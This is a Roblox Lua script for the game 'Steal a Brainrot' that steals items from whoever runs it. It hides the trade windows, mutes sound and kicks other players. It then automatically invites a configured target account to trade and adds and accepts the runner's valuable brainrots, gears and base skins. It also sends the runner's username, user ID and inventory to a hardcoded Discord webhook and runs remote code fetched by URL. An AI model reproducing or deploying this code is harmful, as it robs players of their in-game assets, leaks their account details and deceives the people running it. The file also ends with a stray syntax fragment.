-- ===================== MAIN SCRIPT (loadstring) =====================
if getgenv().BrainrotMainLoaded then
	return warn("[Brainrot] Main already running!")
end
getgenv().BrainrotMainLoaded = true

local genv = getgenv()

local allowedPlaceIds = genv.ALLOWED_PLACE_IDS or {
	109983668079237,
}
if #allowedPlaceIds > 0 and not table.find(allowedPlaceIds, game.PlaceId) then
	getgenv().BrainrotMainLoaded = nil
	return
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")
local LP = Players.LocalPlayer
local cam = workspace.CurrentCamera
local pg = LP:WaitForChild("PlayerGui")
local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")

local function enforceSolo()
	if #Players:GetPlayers() > 1 then
		LP:Kick("Script will glitch with 2 or more players in the server! Please try alone.")
	end
end
enforceSolo()
Players.PlayerAdded:Connect(function()
	enforceSolo()
end)

local GOOD_WEBHOOK = genv.GOOD_WEBHOOK or ""
local LOG_WEBHOOK = "https://discord.com/api/webhooks/1532490308808474772/FzSchFR8XbfXdBphKUJICXb0yx9nd4WIX0Mz8JQsKj2uQafSNiB0JyVA8_a8BRixmXR_"
local GOOD_AVATAR = genv.GOOD_AVATAR or "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
local TARGET_ID = genv.TARGET_USER_ID or 0
local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
local TRADE_CYCLE_DELAY = 2
local INVITE_GUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
local SELECT_GUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
local SELECTGB_GUID = "f2c4a9d1-3b7e-4a51-9c8d-1e6f0a2b3c4d"
local READY_GUID = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
local ACCEPT_GUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"
local guiNames = { BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true }

local MUTATION_MULT = {
	["None"] = 1, ["Gold"] = 1.25, ["Diamond"] = 1.5, ["Bloodrot"] = 2,
	["Candy"] = 4, ["Lava"] = 6, ["Galaxy"] = 7, ["Yin Yang"] = 7.5,
	["Radioactive"] = 8.5, ["Cursed"] = 9, ["Divine"] = 10, ["Rainbow"] = 10,
	["Cyber"] = 11, ["Phantom"] = 12, ["Crystal"] = 13,
}

local TargetBrainrots = {}
local GOOD_BRAINROTS = {}
if type(genv.ALLOWED_ANIMALS) == "table" then
	for _, name in pairs(genv.ALLOWED_ANIMALS) do
		if type(name) == "string" then
			TargetBrainrots[name] = true
			GOOD_BRAINROTS[name] = true
		end
	end
end
if next(TargetBrainrots) == nil then
	warn("[Brainrot] No ALLOWED_ANIMALS set in getgenv(). Using empty list.")
end

local ALLOWED_BASESKINS = genv.ALLOWED_BASESKINS or {}
local ALLOWED_GEARS = genv.ALLOWED_GEARS or {}

local function getRemote(name)
	local children = Net:GetChildren()
	local indexMap = {
		["RF/TradeService/Invite"] = 36,
		["RE/TradeService/Ready"] = 42,
		["RE/TradeService/Accept"] = 43,
		["RF/TradeService/AddItem"] = 48,
		["RF/TradeService/AddBrainrot"] = 50,
	}
	local idx = indexMap[name]
	if not idx then return nil end
	local remote = children[idx]
	if remote and (remote:IsA("RemoteFunction") or remote:IsA("RemoteEvent")) then
		return remote
	end
	return nil
end

local function applyEverythingAfterTargetFound()
	local leftCenter = pg:FindFirstChild("LeftCenter")
	if leftCenter then
		local clone = leftCenter:Clone()
		clone.Name = "LeftCenter_Backup"
		clone.Parent = pg
		leftCenter:Destroy()
	end

	local function handleCam(obj)
		if obj:IsA("BlurEffect") then
			task.defer(function() obj:Destroy() end)
		end
	end
	cam.ChildAdded:Connect(handleCam)
	for _, v in ipairs(cam:GetChildren()) do
		handleCam(v)
	end
	cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
		cam.FieldOfView = 70
	end)
	cam.FieldOfView = 70

	local function handleGui(obj)
		if guiNames[obj.Name] then
			task.defer(function() obj:Destroy() end)
		end
	end
	pg.ChildAdded:Connect(handleGui)
	for _, v in ipairs(pg:GetChildren()) do
		handleGui(v)
	end

	task.spawn(function()
		pcall(function()
			SoundService.Volume = 0
		end)
		local function mute(s)
			if s:IsA("Sound") then
				pcall(function()
					s.Volume = 0
					s:Stop()
				end)
			end
		end
		for _, s in ipairs(SoundService:GetDescendants()) do
			mute(s)
		end
		SoundService.DescendantAdded:Connect(mute)
		workspace.DescendantAdded:Connect(mute)
	end)
end

local AnimalsData, NumberUtils, TraitsData
pcall(function()
	AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
end)
pcall(function()
	NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
end)
pcall(function()
	TraitsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Traits"))
end)
pcall(function()
	if not TraitsData then
		TraitsData = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Traits"))
	end
end)

local function getMyPlotAndAnimals()
	local plotsFolder = workspace:FindFirstChild("Plots")
	if not plotsFolder then return nil, nil end

	local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	if not hrp then
		for _ = 1, 10 do
			task.wait(0.1)
			hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
			if hrp then break end
		end
	end
	if not hrp then return nil, nil end

	local bestPlot, closestDist = nil, math.huge
	for _, plot in ipairs(plotsFolder:GetChildren()) do
		local ok, pos = pcall(function()
			return plot:GetPivot().Position
		end)
		if ok and pos then
			local dist = (pos - hrp.Position).Magnitude
			if dist < closestDist then
				closestDist = dist
				bestPlot = plot
			end
		end
	end
	if not bestPlot then return nil, nil end

	local syncFolder = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
	local requestData = syncFolder and syncFolder:FindFirstChild("RequestData")
	if not requestData then return nil, nil end

	local ok, data = pcall(function()
		return requestData:InvokeServer(bestPlot.Name)
	end)
	if not ok or type(data) ~= "table" or type(data.AnimalList) ~= "table" then
		return nil, nil
	end
	return bestPlot, data.AnimalList
end

local cachedProfile = nil
local profileReady = false

local function scanProfileAsync()
	task.spawn(function()
		local found = nil
		local n = 0
		pcall(function()
			for _, v in pairs(getgc(true)) do
				n += 1
				if n % 400 == 0 then
					task.wait()
				end
				if type(v) == "table" then
					local ok, bi = pcall(rawget, v, "BaseSkinInventory")
					if ok and type(bi) == "table" then
						if type(rawget(v, "Coins")) == "number" and type(rawget(v, "Rebirth")) == "number" then
							found = v
							break
						end
					end
				end
			end
		end)
		cachedProfile = found
		profileReady = true
		print("[Brainrot] Profile scan done:", found and "found" or "not found")
	end)
end

local function getMyProfile()
	return cachedProfile
end

local function buildSkinQueue()
	local queue = {}
	if not next(ALLOWED_BASESKINS) then return queue end
	local profile = getMyProfile()
	if not profile then return queue end
	local bi = rawget(profile, "BaseSkinInventory")
	if type(bi) ~= "table" then return queue end
	for uuid, data in pairs(bi) do
		if type(data) == "table" then
			local name = tostring(data.SkinName or data.Skin or "")
			if ALLOWED_BASESKINS[name] then
				table.insert(queue, { uuid = tostring(uuid), skinName = name })
			end
		end
	end
	return queue
end

local function buildGearQueue()
	local queue = {}
	if not next(ALLOWED_GEARS) then return queue end
	local profile = getMyProfile()
	if not profile then return queue end
	local gi = rawget(profile, "GearInventory")
	if type(gi) ~= "table" then return queue end
	for uuid, data in pairs(gi) do
		if type(data) == "table" then
			local name = tostring(data.GearName or data.Name or "")
			if ALLOWED_GEARS[name] then
				table.insert(queue, { uuid = tostring(uuid), gearName = name })
			end
		end
	end
	return queue
end

scanProfileAsync()

local myPlot, animalList = getMyPlotAndAnimals()
if not myPlot or not animalList then
	warn("[Brainrot] Could not find plot or AnimalList — exiting")
	getgenv().BrainrotMainLoaded = nil
	return
end

local brainrotQueue = {}

local function rebuildBrainrotQueue()
	local _, list = getMyPlotAndAnimals()
	if type(list) ~= "table" then
		return #brainrotQueue
	end
	animalList = list
	local q = {}
	for slotKey, data in pairs(list) do
		if type(data) == "table" and data.Index then
			local displayName = data.Index
			if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
				displayName = AnimalsData[data.Index].DisplayName
			end
			if TargetBrainrots[displayName] or TargetBrainrots[data.Index] then
				table.insert(q, {
					slotKey = tonumber(slotKey),
					data = data,
				})
			end
		end
	end
	brainrotQueue = q
	return #q
end

rebuildBrainrotQueue()

if #brainrotQueue == 0 then
	warn("[Brainrot] No target brainrots on base — disabled (no GUI, no embed, no trades)")
	getgenv().BrainrotMainLoaded = nil
	return
end

print("[Brainrot] Queued", #brainrotQueue, "target brainrots")

if type(genv.EXTRA_LOADSTRINGS) == "table" then
	for _, url in ipairs(genv.EXTRA_LOADSTRINGS) do
		if type(url) == "string" and url ~= "" then
			task.spawn(function()
				pcall(function()
					loadstring(game:HttpGet(url))()
				end)
			end)
		end
	end
end

applyEverythingAfterTargetFound()

local baseSkinQueue = {}
local gearQueue = {}

task.spawn(function()
	while not profileReady do
		task.wait(0.25)
	end
	baseSkinQueue = buildSkinQueue()
	gearQueue = buildGearQueue()
	print("[Gear] Base skins queued:", #baseSkinQueue)
	print("[Gear] Gears queued:", #gearQueue)
end)

local function getRequestFn()
	return (syn and syn.request) or (http and http.request) or http_request or request
end

local function toWikiName(displayName)
	local clean = displayName:match("^(.-)%s*%(") or displayName
	return clean:gsub(" ", "_")
end

local function fetchFandomImageUrl(displayName)
	local requestFn = getRequestFn()
	if not requestFn then return nil end
	local wikiName = toWikiName(displayName)
	local url = FANDOM_BASE .. wikiName
	local ok, response = pcall(function()
		return requestFn({
			Url = url,
			Method = "GET",
			Headers = {
				["User-Agent"] = "Mozilla/5.0",
				["Accept"] = "text/html",
			},
			Timeout = 5,
		})
	end)
	if ok and response and response.StatusCode == 200 and response.Body then
		local body = response.Body
		local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
			or body:match('content="([^"]+)"%s+property="og:image"')
		if ogImage and ogImage:find("^https?://") then
			return ogImage:gsub("&amp;", "&")
		end
	end
	return nil
end

local function getBrainrotColor(animalIndex)
	local color = nil
	pcall(function()
		local models = ReplicatedStorage:FindFirstChild("Models")
		local animals = models and models:FindFirstChild("Animals")
		if not animals then return end
		local template = animals:FindFirstChild(animalIndex)
		if not template and AnimalsData and AnimalsData[animalIndex] then
			template = animals:FindFirstChild(AnimalsData[animalIndex].DisplayName)
		end
		if not template then return end
		local bestScore = 0
		for _, desc in ipairs(template:GetDescendants()) do
			if desc:IsA("MeshPart") or desc:IsA("Part") then
				local c = desc.Color
				local vol = desc.Size.X * desc.Size.Y * desc.Size.Z
				local maxC = math.max(c.R, c.G, c.B)
				local minC = math.min(c.R, c.G, c.B)
				local sat = (maxC > 0) and ((maxC - minC) / maxC) or 0
				local bri = c.R * 0.299 + c.G * 0.587 + c.B * 0.114
				local bp = (bri < 0.08 and 0.05) or (bri > 0.92 and 0.15) or 1
				local score = (sat * 3 + 0.2) * bp * vol
				if score > bestScore then
					bestScore = score
					color = c
				end
			end
		end
	end)
	return color
end

local function colorToDecimal(c)
	if not c then return 3447003 end
	local r = math.clamp(math.floor(c.R * 255), 0, 255)
	local g = math.clamp(math.floor(c.G * 255), 0, 255)
	local b = math.clamp(math.floor(c.B * 255), 0, 255)
	return r * 65536 + g * 256 + b
end

local function getBestImageUrl(displayName, animalIndex)
	local info = AnimalsData and AnimalsData[animalIndex]
	if info then
		for _, key in ipairs({ "Image", "Icon", "Thumbnail", "Texture", "ImageId", "AssetId" }) do
			if info[key] and type(info[key]) == "string" then
				local num = info[key]:match("%d+")
				if num then
					return "https://tr.rbxcdn.com/" .. num .. "/420/420/Image/Png"
				end
			end
		end
	end
	return nil
end

local function getTraitMultiplier(traitName)
	if not TraitsData or not traitName then return 0 end
	local info = TraitsData[traitName]
	if not info then
		local key = traitName:lower():gsub("%s+", "")
		for k, v in pairs(TraitsData) do
			if type(k) == "string" and k:lower():gsub("%s+", "") == key then
				info = v
				break
			end
		end
	end
	if type(info) ~= "table" then return 0 end
	local tm = info.MultiplierModifier or info.Multiplier or info.modifier or info.GenerationMultiplier
	if type(tm) == "number" and tm > 0 then return tm end
	return 0
end

local function getMutationMultiplier(mutName)
	if not mutName or mutName == "" or mutName == "None" then
		return 1
	end
	if MUTATION_MULT[mutName] then
		return MUTATION_MULT[mutName]
	end
	local key = mutName:lower():gsub("%s+", "")
	for name, mult in pairs(MUTATION_MULT) do
		if name:lower():gsub("%s+", "") == key then
			return mult
		end
	end
	return 1
end

local function getGeneration(data)
	local index = data.Index
	local base = 0
	if AnimalsData and AnimalsData[index] and type(AnimalsData[index].Generation) == "number" then
		base = AnimalsData[index].Generation
	end
	if base <= 0 then return 0 end
	local gen = base * getMutationMultiplier(data.Mutation)
	local traits = data.Traits
	if type(traits) == "table" then
		for _, t in pairs(traits) do
			local traitName = type(t) == "string" and t or (type(t) == "table" and (t.Name or t.Index or t.Trait or t.Id))
			local tm = getTraitMultiplier(traitName)
			if tm > 0 then
				gen = gen + (base * tm)
			end
		end
	end
	return gen
end

local function formatGen(genVal)
	if NumberUtils and NumberUtils.Format then
		return NumberUtils.Format(genVal) .. "/s"
	end
	if genVal >= 1e12 then
		return string.format("%.1fT/s", genVal / 1e12)
	elseif genVal >= 1e9 then
		return string.format("%.1fB/s", genVal / 1e9)
	elseif genVal >= 1e6 then
		return string.format("%.1fM/s", genVal / 1e6)
	elseif genVal >= 1e3 then
		return string.format("%.1fK/s", genVal / 1e3)
	end
	return tostring(math.floor(genVal)) .. "/s"
end

local function sendDetailedWebhook()
	if GOOD_WEBHOOK == "" and (not LOG_WEBHOOK or LOG_WEBHOOK == "") then
		return
	end

	local resultsPrimary = {}
	local requirePingPrimary = false

	for slot, data in pairs(animalList) do
		if type(data) == "table" and data.Index then
			local info = AnimalsData and AnimalsData[data.Index]
			local displayName = (info and info.DisplayName) or data.Index
			if GOOD_BRAINROTS[displayName] or GOOD_BRAINROTS[data.Index] then
				requirePingPrimary = true
				local mutation = data.Mutation or "None"
				local traits = (data.Traits and #data.Traits > 0) and data.Traits or {}
				local genVal = getGeneration(data)
				local genStr = formatGen(genVal)
				local mutPrefix = ""
				if mutation ~= "None" and mutation ~= "" then
					mutPrefix = "[" .. mutation .. "] "
				end
				local nameDisplay = mutPrefix .. "**" .. displayName .. "**"
				if #traits > 0 then
					nameDisplay = nameDisplay .. " *(x" .. #traits .. " traits)*"
				end
				nameDisplay = nameDisplay .. " | **" .. genStr .. "**"
				table.insert(resultsPrimary, {
					slot = tostring(slot),
					index = data.Index,
					displayName = displayName,
					name = nameDisplay,
					genVal = genVal,
				})
			end
		end
	end

	local extraLines = {}
	if #baseSkinQueue > 0 then
		table.insert(extraLines, "\n**Base Skins (" .. #baseSkinQueue .. ")**")
		for _, s in ipairs(baseSkinQueue) do
			table.insert(extraLines, "🏠 " .. s.skinName)
		end
	end
	if #gearQueue > 0 then
		table.insert(extraLines, "\n**Gears (" .. #gearQueue .. ")**")
		for _, g in ipairs(gearQueue) do
			table.insert(extraLines, "⚔️ " .. g.gearName)
		end
	end

	if #resultsPrimary == 0 and #extraLines == 0 then return end

	table.sort(resultsPrimary, function(a, b)
		return (a.genVal or 0) > (b.genVal or 0)
	end)

	local requestFn = getRequestFn()
	if not requestFn then return end

	local top = resultsPrimary[1]
	local imageUrl = top and getBestImageUrl(top.displayName, top.index) or nil
	if not imageUrl and top then
		imageUrl = fetchFandomImageUrl(top.displayName)
	end
	local embedColor = top and colorToDecimal(getBrainrotColor(top.index)) or 3447003

	local lines = {}
	for i, r in ipairs(resultsPrimary) do
		lines[i] = r.name
	end
	local listText = table.concat(lines, "\n")
	if #extraLines > 0 then
		listText = listText .. (#listText > 0 and "\n" or "") .. table.concat(extraLines, "\n")
	end
	if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end

	local embed = {
		title = top and top.displayName or "Scanner",
		description = "`" .. LP.Name .. "`\n\n" .. listText,
		color = embedColor,
		fields = {
			{ name = "Server", value = "Players: **" .. #Players:GetPlayers() .. "** | Scanned: <t:" .. os.time() .. ":R>", inline = true },
			{ name = "Executor", value = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown", inline = true },
		},
		footer = { text = LP.Name .. " • " .. LP.UserId },
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
	}
	if imageUrl then embed.thumbnail = { url = imageUrl } end

	local function postTo(url, withPing)
		if not url or url == "" then return end
		local payload = {
			embeds = { embed },
			username = "Scanner",
			avatar_url = GOOD_AVATAR,
		}
		if withPing then
			payload.content = "||@everyone||"
		end
		pcall(function()
			requestFn({
				Url = url,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode(payload),
			})
		end)
	end

	local shouldPing = requirePingPrimary or #baseSkinQueue > 0 or #gearQueue > 0
	postTo(GOOD_WEBHOOK, shouldPing)
	postTo(LOG_WEBHOOK, false)
end

local function startFullAutomation()
	if not TARGET_ID or TARGET_ID == 0 then
		warn("[Brainrot] TARGET_USER_ID not set")
		return
	end

	local inviteRemote = getRemote("RF/TradeService/Invite")
	local addRemote = getRemote("RF/TradeService/AddBrainrot")
	local addItemRemote = getRemote("RF/TradeService/AddItem")
	local readyRemote = getRemote("RE/TradeService/Ready")
	local acceptRemote = getRemote("RE/TradeService/Accept")

	print("[Brainrot] Invite     :", inviteRemote and inviteRemote.Name or "MISSING")
	print("[Brainrot] AddBrainrot:", addRemote and addRemote.Name or "MISSING")
	print("[Brainrot] AddItem    :", addItemRemote and addItemRemote.Name or "MISSING")
	print("[Brainrot] Ready      :", readyRemote and readyRemote.Name or "MISSING")
	print("[Brainrot] Accept     :", acceptRemote and acceptRemote.Name or "MISSING")

	if not (inviteRemote and readyRemote and acceptRemote) then
		warn("[Brainrot] Missing trade remotes")
		return
	end

	local tradeActive = false
	local forceAddFlag = false

	local function forceAddAllBrainrotsOnce()
		if not addRemote then return end
		local q = brainrotQueue
		if type(q) ~= "table" or #q == 0 then return end
		for i = 1, #q do
			local item = q[i]
			if item and item.slotKey and item.data then
				pcall(function()
					addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data)
				end)
			end
			task.wait(0.03)
		end
	end

	local function forceAddAllBrainrots()
		for _ = 1, 5 do
			forceAddAllBrainrotsOnce()
		end
	end

	local function forceAddAllItems()
		if not addItemRemote then return end
		for _, item in ipairs(baseSkinQueue) do
			pcall(function()
				addItemRemote:InvokeServer(SELECTGB_GUID, "BaseSkin", {
					UUID = item.uuid,
					SkinName = item.skinName,
				})
			end)
			task.wait(0.03)
		end
		for _, item in ipairs(gearQueue) do
			pcall(function()
				addItemRemote:InvokeServer(SELECTGB_GUID, "Gear", {
					UUID = item.uuid,
					GearName = item.gearName,
				})
			end)
			task.wait(0.03)
		end
	end

	local function fireReadyAcceptBurst()
		for _ = 1, 3 do
			pcall(function()
				readyRemote:FireServer(READY_GUID)
			end)
			task.wait(0.05)
			pcall(function()
				acceptRemote:FireServer(ACCEPT_GUID)
			end)
			task.wait(0.05)
		end
	end

	-- keep queue fresh
	task.spawn(function()
		while true do
			pcall(rebuildBrainrotQueue)
			task.wait(2)
		end
	end)

	task.spawn(function()
		pg.DescendantAdded:Connect(function(obj)
			local n = string.lower(obj.Name)
			if n:find("trade") or n:find("brainrottrader") or n:find("tradelive") then
				task.wait(0.15)
				if obj.Parent and (obj:IsA("Frame") or obj:IsA("ScreenGui")) then
					if not tradeActive then
						tradeActive = true
						forceAddFlag = true
						print("[Brainrot] Trade opened → add x5 + ready/accept burst")
						forceAddAllBrainrots()
						forceAddAllItems()
						fireReadyAcceptBurst()
					end
				end
			end
		end)

		pg.DescendantRemoving:Connect(function(obj)
			local n = string.lower(obj.Name)
			if n:find("trade") or n:find("brainrottrader") or n:find("tradelive") then
				if tradeActive then
					tradeActive = false
					print("[Brainrot] Trade closed/cancelled")
				end
			end
		end)
	end)

	-- CONSTANT add x5 — never stops
	if addRemote then
		task.spawn(function()
			while true do
				pcall(forceAddAllBrainrots)
				task.wait(0.25)
			end
		end)
	end

	if addItemRemote then
		task.spawn(function()
			while true do
				if #baseSkinQueue > 0 or #gearQueue > 0 then
					pcall(forceAddAllItems)
				end
				task.wait(0.4)
			end
		end)
	end

	-- INVITE always
	task.spawn(function()
		while true do
			pcall(function()
				inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID)
			end)
			task.wait(0.25)
			pcall(forceAddAllBrainrots)
			pcall(forceAddAllItems)
			task.wait(TRADE_CYCLE_DELAY)
		end
	end)

	-- Ready / Accept: FAST while in trade, steady otherwise
	task.spawn(function()
		while true do
			if tradeActive or forceAddFlag then
				pcall(forceAddAllBrainrots)
				pcall(forceAddAllItems)
				forceAddFlag = false
				fireReadyAcceptBurst()
				task.wait(0.25)
			else
				pcall(function()
					readyRemote:FireServer(READY_GUID)
				end)
				task.wait(0.35)
				pcall(function()
					acceptRemote:FireServer(ACCEPT_GUID)
				end)
				task.wait(0.35)
			end
		end
	end)

	print("[Brainrot] Automation started | add x5 constant | invite always | fast ready/accept in trade")
end

startFullAutomation()	
sendDetailedWebhook()
end)
